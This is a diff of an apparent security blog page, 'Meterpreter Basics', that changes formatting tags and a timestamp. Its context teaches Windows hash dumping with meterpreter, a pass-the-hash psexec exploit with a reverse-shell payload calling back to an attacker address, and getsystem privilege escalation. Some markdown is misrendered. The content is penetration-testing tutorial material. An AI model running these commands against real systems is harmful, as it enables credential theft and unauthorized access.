@@ -97,7 +97,7 @@
 <meta property="og:url" content="/2017/12/03/2017-12-03-Meterpreter-Basics/index.html">
 <meta property="og:site_name" content="Ꭰ&#39;s security blog">
 <meta property="og:description" content="Let’s know something basic before we start. You can skip the following if you are familiar with them.">
-<meta property="og:updated_time" content="2017-12-03T06:29:13.998Z">
+<meta property="og:updated_time" content="2017-12-03T06:42:33.627Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Meterpreter Basics">
 <meta name="twitter:description" content="Let’s know something basic before we start. You can skip the following if you are familiar with them.">
@@ -388,11 +388,11 @@
 <li><strong>Shellcode</strong> (<em>Shellcode</em> is a set of instructions used as a payload when exploitation occurs.)</li>
 <li><strong>Module</strong> (A <em>module</em> in the context of this book is a piece of software that can be used by the Metasploit Framework)</li>
 <li><strong>Listener</strong> (A <em>Listener</em> is a component within Metasploit that waits for an incoming connection of some sort.)</li>
-<li><strong>Resource Files</strong> (<em>Resource files</em> are script files that automate commands within msfconsole. They contain a list of commands that are executed from msfconsole and run sequentially) For example,  <code>msfconsole -r filename.rc</code> .</li>
+<li><strong>Resource Files</strong> (<em>Resource files</em> are script files that automate commands within msfconsole. They contain a list of commands that are executed from msfconsole and run sequentially) For example,  <em>msfconsole -r filename.rc</em> .</li>
 </ul>
 <p>####Hash Dump</p>
 <p>If we exploit a windows machine in the penetration test, the next step is how to get the administrative privileges. Here are some tips.</p>
-<p>Try to dump the usernames and passwords. Because the <em>module</em> priv is integrated into the <code>meterpreter</code> . So what you need to do is just type the chars <code>hashdump</code>. You will see the following. </p>
+<p>Try to dump the usernames and passwords. Because the <em>module</em> priv is integrated into the <em>meterpreter</em> . So what you need to do is just type the chars <em>hashdump</em>. You will see the following. </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Remember that the hash value starts with *aad3b435* is simply an empty or null hash value — a placeholder for an empty string. Besides that we should know that we must run as **SYSTEM** to get around the registry restrictions and dump the protected the selected **SAM(Security Account Manager)** storage that contains Windows usernames and passwords.</div><div class="line"></div><div class="line">What should I do after I got the hash value? Of course, you can use the rainbow table to crack the hash password. We can pass the hash value to login if we can&apos;t crack the hash value just like the normal logon. </div><div class="line"></div><div class="line">```shell</div><div class="line">use windows/smb/psexec</div><div class="line">set PAYLOAD windows/meterpreter/reverse_tcp</div><div class="line">set LHOST 192.168.33.129</div><div class="line">set LPORT 443</div><div class="line">set RHOST 192.168.33.130</div><div class="line">set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0</div><div class="line">exploit</div></pre></td></tr></table></figure>
 <p>####Get System</p>
 <p>The easiest way to escalate privilege is use the command <code>getsystem</code> which has been integrated into the <em>meterpreter</em>. </p>
